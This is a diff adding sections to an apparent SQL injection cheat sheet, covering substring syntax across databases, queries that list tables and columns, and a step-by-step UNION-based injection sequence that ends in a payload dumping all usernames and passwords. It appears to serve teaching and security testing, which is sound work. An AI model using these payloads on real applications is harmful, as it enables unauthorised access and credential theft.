@@ -94,4 +94,43 @@ user3~password3
 ...  
 ```
 
+## Substring
 
+Each of the following expressions will return the string `ba` (Note that the offset index is *1-based*).
+
+<pre>
+<b>Oracle</b>:
+	SUBSTR('foobar', 4, 2)
+<b>Microsoft</b>, <b>PostgreSQL</b>, <b>MySQL</b>:
+	SUBSTRING('foobar', 4, 2)
+</pre>
+
+## Database contents
+
+You can list the tables that exist in the database, and the columns that those tables contain.
+
+**Oracle**:
+```SQL
+	SELECT * FROM all_tables
+	SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+**Microsoft**, **PostgreSQL**, **MySQL**:
+```SQL
+	SELECT * FROM information_schema.tables
+	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+Example of SQL injection attack, listing the database content on non-Oracle databases:
+
+```SQL
+-- 1. Verify that the qurey is returning two columns, both of which contain text:
+UNION SELECT 'abc','def'--
+-- 2. Retrieve the list of tables in the database (table_name is found by searching information_chema.table)
+UNION SELECT table_name, NULL FROM information_schema.tables--
+-- 3. Find the name of the table containing user credentials ==> user_xxx
+-- 4. Retrieve the details of the columns in the table
+UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='user_xxx'--
+-- 5. Find the names of the columns containing usernames and passwords (i.e: username_xxx, password_xxx)
+-- 6. Retrieve the usernames and passwords for all
+UNION SELECT username_xxx,+password_xxx FROM user_xxx--
+
+```
